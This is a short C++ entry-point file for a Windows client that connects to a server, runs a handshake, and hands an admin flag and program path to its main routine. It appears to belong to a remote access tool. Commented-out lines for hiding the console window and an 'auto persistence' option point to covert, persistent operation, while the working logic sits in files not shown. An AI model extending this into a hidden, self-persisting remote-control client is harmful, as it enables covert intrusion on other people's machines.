#include "../inc/Connexion.h"
#include "../inc/HandShake.h"
#include <windows.h>


int main()
{
    //-lws2_32
    //ShowWindow(GetConsoleWindow(),SW_HIDE);

    Connexion Client; 
    HandShake Handshake;

    //bool auto_persistence = false; //allows you to know if the auto persistence mode is active or not.

    Client.openConnexion();
    cout << "[+] Connected." << endl;

    cout << "Start connexion in startHandShake." << endl;

















    Handshake.setSock(Client.getSocket());
    Handshake.beforeHandShake();
    Handshake.startHandShake();    
    cout << "[+] Handshake finished..." << endl;
    
    cout << "[+] client main go " << endl;
    Client.main(Handshake.getIsAdmin(), Handshake.getPathProg());    
    Client.closeConnexion();
    cout << "[+] Finished." << endl;
}
